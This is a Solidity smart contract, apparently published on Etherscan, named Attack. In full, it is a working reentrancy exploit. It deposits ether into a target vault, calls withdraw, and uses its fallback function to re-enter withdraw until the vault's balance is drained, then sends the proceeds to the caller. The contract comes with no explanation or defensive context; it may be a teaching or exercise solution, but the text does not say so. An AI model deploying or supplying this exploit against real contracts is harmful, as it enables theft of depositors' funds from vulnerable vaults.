/**
 *Submitted for verification at Etherscan.io on 2022-12-14
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.8;


interface IAttack {
    function attack(address targetVault) external payable;
}

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}


contract Attack is IAttack {
    IVault private attackTarget;

    function attack(address targetVault) public payable {
        attackTarget = IVault(targetVault);
        attackTarget.deposit{value: msg.value}();
        attackTarget.withdraw();
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Failed!");
    }

    fallback() external payable {
        if (address(attackTarget).balance > 0) {
            attackTarget.withdraw();
        }
    }
}